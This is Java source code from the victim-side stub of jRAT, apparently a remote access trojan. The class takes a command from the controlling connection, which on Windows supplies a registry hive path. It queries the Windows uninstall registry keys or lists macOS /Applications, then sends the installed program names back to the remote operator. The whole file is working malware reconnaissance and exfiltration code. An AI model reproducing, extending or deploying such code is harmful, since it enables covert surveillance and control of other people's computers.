package se.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet55InstalledProgram;

import com.redpois0n.oslib.OperatingSystem;


public class Packet81InstalledPrograms extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = Connection.instance.readLine();
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Process p;
				if (path.equalsIgnoreCase("hklm")) {
					p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hklm\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
				} else {
					p = Runtime.getRuntime().exec(new String[] { "reg", "query", path + "\\software\\microsoft\\windows\\currentversion\\uninstall\\", "/s" });
				}
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

				String line;

				while ((line = reader.readLine()) != null) {
					line = line.trim();
					if (path.equalsIgnoreCase("hklm")) {
						if (line.startsWith("DisplayName")) {
							String str = line.split("    ")[2];
							if (!str.startsWith("@")) {
								Connection.instance.addToSendQueue(new Packet55InstalledProgram(str));
							}
						}
					} else {
						if (line.lastIndexOf("\\") != -1) {
							String str = line.substring(line.lastIndexOf("\\") + 1, line.length());
							Connection.instance.addToSendQueue(new Packet55InstalledProgram(str));
						}
					}
				}
				reader.close();
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
				File[] apps = new File("/Applications/").listFiles();

				for (File app : apps) {
					String name = app.getName();

					if (name.contains(".app")) {
						name = name.replace(".app", "");
						Connection.instance.addToSendQueue(new Packet55InstalledProgram(name));
					}
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
